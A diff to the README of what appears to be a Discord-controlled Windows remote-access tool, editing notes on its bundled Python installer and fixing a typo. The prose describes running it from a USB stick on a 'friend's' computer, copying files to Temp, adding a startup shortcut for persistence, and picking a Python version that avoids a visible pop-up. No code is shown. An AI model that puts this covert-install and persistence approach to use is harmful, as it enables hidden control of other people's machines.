@@ -61,7 +61,7 @@ If you want to put this program into another friend's computer just change the T
 
 This only works on Windows Systems. (Doesn't work on Mac nor on \*nix)
 
-PS: For the paranoids: If you think scripts/python-installer.exe is unsafe just install a Python3.7+ from the original site by yourself and rename it to python-installer.exe. Would remcommend a version lower between 3.7 and 3.10 so it works and doesn't pop a notification.
+PS: For the paranoids: If you think scripts/python-installer.exe is unsafe just install a Python3.7+ from the original site by yourself and rename it to `python-installer.exe` (32-bit) and the 64-bit version to `python-installer-amd64.exe`. It must be a version 3.7+ but I would recommend one 3.10- so it doesn't show a pop-up.
 
 This was tested on Windows10 and Windows11 in different languages.
 
@@ -76,7 +76,7 @@ All cleaned!
 
 ## How this works internally
 
-When you inject the pen and click `run.bat` it check if you have python3.7+ installed otherwise it installs for you.  
+When you inject the pen and click `run.bat` it checks if you have python3.7+ installed otherwise it installs for you.  
 Then it copies the files to your Temp folder and creates a shortcut in your startup folder.  
 Inside the program it is a discord bot with some comands for windows.
 
